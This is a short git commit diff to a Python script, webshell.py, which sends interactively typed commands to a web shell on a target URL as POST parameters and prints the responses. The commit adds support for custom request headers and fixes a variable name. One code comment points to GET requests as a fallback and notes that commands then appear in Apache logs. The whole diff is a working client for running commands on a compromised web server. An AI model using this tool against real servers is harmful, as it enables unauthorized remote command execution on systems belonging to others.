3bd3a985d257a0d242e4ce278d90a158e5afb006
neuronaddict <22725031+NeuronAddict@users.noreply.github.com>
2020-07-25 17:27:24 +0200

    add headers + fix cmd

--- webshell.py
+++ webshell.py
@@ -6,20 +6,30 @@ import sys
 
 
 parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
-parser.add_argument('url')
+parser.add_argument('--header', action='append')
 parser.add_argument('--cmd', default='cmd')
+parser.add_argument('url')
 
 args = parser.parse_args()
 
 url = args.url
-cms = args.cmd
+cmd = args.cmd
 
 
 s = requests.Session()
 
+headers = {}
+
+if args.header:
+	for header in args.header:
+		
+		key = header.split(':')[0]
+		value = header[header.index(': ')+2:]
+		headers[key] = value
+
 while True:
     c = input('--> ')
-    r = s.post(url, data={cmd: c})
+    r = s.post(url, data={cmd: c}, headers=headers)
     # use this in place of post if you can't make post requests (commands are displayeds in apache logs)
     #r = s.get(url, params={cmd: c})
     print(r.request.url)
